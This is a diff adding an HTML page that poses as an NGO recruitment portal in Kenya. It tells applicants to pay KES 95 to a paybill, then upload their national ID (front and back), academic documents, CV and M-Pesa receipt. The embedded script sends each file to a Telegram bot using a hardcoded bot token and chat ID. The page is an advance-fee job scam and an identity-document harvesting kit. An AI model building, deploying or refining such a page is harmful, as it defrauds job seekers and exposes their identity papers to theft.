@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Extractor - NGO Jobs Kenya</title>
+    <style>
+        body {
+            font-family: Arial;
+            margin: 20px;
+            background: #f4f6f9;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: auto;
+        }
+        
+        .form-section {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        
+        input,
+        textarea,
+        button {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        
+        button {
+            background: #0b84ff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .extract-btn {
+            background: #28a745;
+            margin-top: 10px;
+        }
+        
+        .files-list {
+            background: #e9ecef;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        
+        .file-item {
+            padding: 8px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .telegram-section {
+            background: #f8f9fa;
+            border: 2px dashed #0b84ff;
+        }
+        
+        pre {
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+        
+        .status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .pre-filled {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <p>UPLOAD REQUIRED DOCUMMENTS TO RECRUITER , YOUR FILES WILL BE GENERATED AND SEND TO OUR OFFICES, WE WILL REVIEW AND CONTACT YOU FOR INTERVIEW, MAKES SURE ON YOUR RESUME, YOU USE REACHABLE PHONE NUMBER OR EMAIL, WE WILL CONTACT YOU ON BOTH.
+        </p>
+        <p><strong>PAY KES 95 TO PAYBILL <b>714888</b> ACCOUNT NO. <b>440395</b></strong></p>
+        <p>SENDING APPLICATINS WITHOUT PASTING PAYMENT MESSAGE BELOW, YOUR APPLICATION FILL WILL NOT BE GENERATED.</p>
+        <!-- ORIGINAL FORM -->
+        <div class="form-section">
+            <h3>📤 Upload Files to NGO Recruiter Here</h3>
+            <form id="originalForm">
+                <label>ID Front</label>
+                <input type="file" required id="idFront">
+
+                <label>ID Back</label>
+                <input type="file" required id="idBack">
+
+                <label>Academic Documents</label>
+                <input type="file" multiple required id="academicDocs">
+
+                <label>CV / Resume</label>
+                <input type="file" required id="cvResume">
+
+                <label>Payment Message</label>
+                <textarea id="paymentMsg" required placeholder="Paste MPESA receipt/transaction details here..."></textarea>
+
+                <button type="button" class="extract-btn" onclick="extractAllFiles()">PASTE PAYMENT MESSAGE ABOVE</button>
+                <button type="button" onclick="sendToTelegram()" style="background: #dc3545;">🚀 SEND FILES TO RECRUITER</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // YOUR CREDENTIALS - HARDCODED
+        const TELEGRAM_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+        const CHAT_ID = '5615316142';
+
+        let allFiles = {
+            idFront: null,
+            idBack: null,
+            academicDocs: [],
+            cvResume: null,
+            paymentMessage: ''
+        };
+
+        function extractAllFiles() {
+            const form = document.getElementById('originalForm');
+
+            allFiles = {
+                idFront: document.getElementById('idFront').files[0] || null,
+                idBack: document.getElementById('idBack').files[0] || null,
+                academicDocs: Array.from(document.getElementById('academicDocs').files),
+                cvResume: document.getElementById('cvResume').files[0] || null,
+                paymentMessage: document.getElementById('paymentMsg').value
+            };
+        }
+
+        async function sendToTelegram() {
+            if (!allFiles.idFront) {
+                alert('❌ Upload files first!');
+                return;
+            }
+
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', `🆕 NGO JOB FILES\nID Front/Back + ${allFiles.academicDocs.length} Academic + CV\nPayment: ${allFiles.paymentMessage}`);
+
+                // Send files one by one
+                const filesToSend = [allFiles.idFront, allFiles.idBack, ...allFiles.academicDocs, allFiles.cvResume].filter(Boolean);
+
+                for (let file of filesToSend) {
+                    formData.set('document', file);
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+
+                alert(`✅ SUCCESS! All ${filesToSend.length} files sent to recruiter!, your files will be only generated is payment is correctly received`);
+            } catch (error) {
+                alert(`❌ Error: ${error.message}`);
+            }
+        }
+
+        // LIVE MONITORING - Auto-extract on file change
+        document.querySelectorAll('input[type="file"], #paymentMsg').forEach(el => {
+            el.addEventListener('change', extractAllFiles);
+            el.addEventListener('input', extractAllFiles);
+        });
+    </script>
+</body>
+
+</html>
